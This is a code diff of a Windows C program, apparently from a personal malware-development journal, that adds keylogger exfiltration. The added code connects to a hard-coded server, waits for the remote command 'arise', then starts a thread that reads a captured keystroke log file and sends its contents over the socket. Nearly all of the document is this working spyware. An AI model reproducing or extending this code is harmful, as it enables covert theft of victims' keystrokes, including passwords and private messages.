@@ -4,13 +4,38 @@
 #include <winsock2.h>
 #include <windows.h>
 
-#define SERVER_IP "192.168.1.14"  // Change this to the Linux server IP
-#define SERVER_PORT 8080
+
+#define SERVER_IP "192.168.1.13"  // Change this to the Linux server IP
+#define SERVER_PORT 2005
 #define BUF_SIZE 1024
 
-// Function to send keystrokes to the server
-void send_keystroke(SOCKET sock, const char* key) {
-    send(sock, key, strlen(key), 0);
+HANDLE hMutex;
+DWORD WINAPI send_file(LPVOID lpBuffer) {
+    DWORD dwWaitResult = WaitForSingleObject(hMutex, INFINITE);
+    if (dwWaitResult == WAIT_OBJECT_0) {
+        FILE *fp;
+        char *filename = "C:\\Users\\blackrose\\Desktop\\MalDevJournal\\keylogger\\keylogger.txt";
+        char buffer[BUF_SIZE];
+        int bytes_sent;
+        SOCKET sock = *(SOCKET*)lpBuffer;
+        
+        if ((fp = fopen(filename, "r")) == NULL) {
+            printf("Error opening file\n");
+            return -1;
+        }
+        while ((bytes_sent = fread(buffer, sizeof(char), BUF_SIZE, fp)) > 0) {
+            send(sock, buffer, bytes_sent, 0);
+        }
+        if (bytes_sent == 0) {
+            printf("File transfer complete\n");    
+        } else {
+            printf("Error sending file\n");
+            return -1;
+        }
+        fclose(fp);
+        ReleaseMutex(hMutex);
+    }
+    return 0;
 }
 
 int main() {
@@ -35,29 +60,28 @@ int main() {
     server.sin_port = htons(SERVER_PORT);
 
     // Connect to the server
+    
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
         printf("Connection failed\n");
         return 1;
     }
 
-    printf("Connected to server...\n");
-    char name[7];
-    fgets(name, sizeof(name),stdin);
-    if(send(sock, name, strlen(name), 0) < 0) {
-        printf("Error sending name\n");
-        return 1;
-    } else {
-        printf("Name sent successfully\n");
-    }
-    
+    printf("Connected to server...\n"); 
+    hMutex = CreateMutex(NULL, FALSE, NULL);   
     // Start capturing keystrokes
     while (1) {
-        char message[1024];
-        fgets(message, 1024, stdin);
-        if(send(sock, message, strlen(message), 0) < 0) {
-            printf("Error sending message\n");
-            return 1;
+        char buffer[BUF_SIZE] = {0};
+        int len = recv(sock, buffer, BUF_SIZE, 0);
+        // buffer[len-1]='\0';
+        printf("Received: %s\n", buffer);
+        if(strcmp(buffer, "arise") == 0) {
+            if(send(sock, "commandar", strlen("commandar"),0) == -1){
+                return 1;
+            } else {
+                HANDLE handle = CreateThread(NULL, 0, send_file, &sock, 0, NULL);
+            }
         }
+        
     }
 
     // Cleanup
